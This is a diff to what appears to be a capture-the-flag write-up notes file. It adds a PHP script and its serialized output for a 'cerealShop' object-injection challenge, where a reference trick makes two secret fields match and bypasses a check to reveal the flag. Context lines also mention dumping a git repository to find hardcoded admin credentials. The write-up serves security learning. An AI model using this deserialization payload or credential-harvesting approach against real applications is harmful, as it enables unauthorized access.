@@ -15,7 +15,33 @@ Everything in discord question.
 
 # cerealShop:
 php objection injection. Everything in discord question.
+Serialized object which will give flag:
+```
+<?php
 
+class Admin {
+    public $is_admin;
+    public $your_secret;
+    public $my_secret;
+}
+
+$obj = new Admin();
+$obj->is_admin = "0";          // Assigning a string "0" to is_admin
+$obj->your_secret = NULL;      // Setting your_secret to NULL, can set to anything dosen't have to be NULL 
+$obj->my_secret = &$obj->your_secret;  // Assigning your_secret to my_secret
+
+$serialized = serialize($obj);
+echo $serialized;
+
+?>
+```
+Output:
+```
+O:5:"Admin":3:{s:8:"is_admin";s:1:"0";s:11:"your_secret";N;s:9:"my_secret";R:3;}```
+
+Still trying to wrap my head around why this works because in the actual server obj->my_secret = $FLAG is done before running the if check. 
+But for some reason if we send this object my_secret still references your_secret and not the value of FLAG which it is being set to 
+and thus the my_secret = your_secret if condition gets bypassed.
 # moviereviewapp:
 git dump the application. Go through the commits to find about  the servermonitor/admin directory which had a hidden admin login page. The creds can be seen hardcoded while going through other commits.
 Logging into the admin panel we see a page which can be used to ping an ip address.
